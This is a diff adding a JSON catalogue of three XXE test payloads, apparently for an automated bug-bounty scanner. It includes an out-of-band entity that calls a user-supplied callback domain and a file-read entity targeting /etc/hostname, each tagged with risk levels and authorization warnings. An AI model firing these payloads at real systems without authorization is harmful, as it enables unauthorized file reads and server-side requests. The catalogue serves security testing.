@@ -1,0 +1,49 @@
+[
+  {
+    "category": "xxe",
+    "subcategory": "parser-detection",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE bbtest [<!ENTITY x \"bbtest-marker\">]><root>&x;</root>",
+    "context": "xml-body",
+    "purpose": "fingerprint",
+    "detection_method": "string_reflection",
+    "expected_indicator": "response contains 'bbtest-marker', confirming the XML parser resolves internal entities at all before trying external ones",
+    "risk_level": "SAFE",
+    "safe_for_automation": true,
+    "owasp": ["A05"],
+    "cwe": ["CWE-611"],
+    "source_id": "portswigger",
+    "source_url": "https://portswigger.net/web-security/xxe"
+  },
+  {
+    "category": "xxe",
+    "subcategory": "oast",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE bbtest [<!ENTITY % x SYSTEM \"http://{oast_domain}/xxe-test\"> %x;]>",
+    "context": "xml-body",
+    "purpose": "oast-detection",
+    "detection_method": "out_of_band_callback",
+    "expected_indicator": "an inbound HTTP request is recorded on the user-supplied OAST endpoint - preferred over attempting to read local files directly",
+    "risk_level": "LOW",
+    "safe_for_automation": true,
+    "requires_manual_validation": true,
+    "owasp": ["A05"],
+    "cwe": ["CWE-611"],
+    "source_id": "portswigger",
+    "source_url": "https://portswigger.net/web-security/xxe/blind"
+  },
+  {
+    "category": "xxe",
+    "subcategory": "local-entity-reference",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE bbtest [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><root>&x;</root>",
+    "context": "xml-body",
+    "purpose": "impact-demonstration",
+    "detection_method": "manual",
+    "expected_indicator": "RESTRICTED - reference only. Use a benign, non-sensitive file (like /etc/hostname) purely to prove file-read capability; never target credentials, keys or /etc/shadow (see §14/§15) - requires explicit authorization.",
+    "risk_level": "RESTRICTED",
+    "safe_for_automation": false,
+    "requires_manual_validation": true,
+    "owasp": ["A05"],
+    "cwe": ["CWE-611"],
+    "source_id": "portswigger",
+    "source_url": "https://portswigger.net/web-security/xxe"
+  }
+]
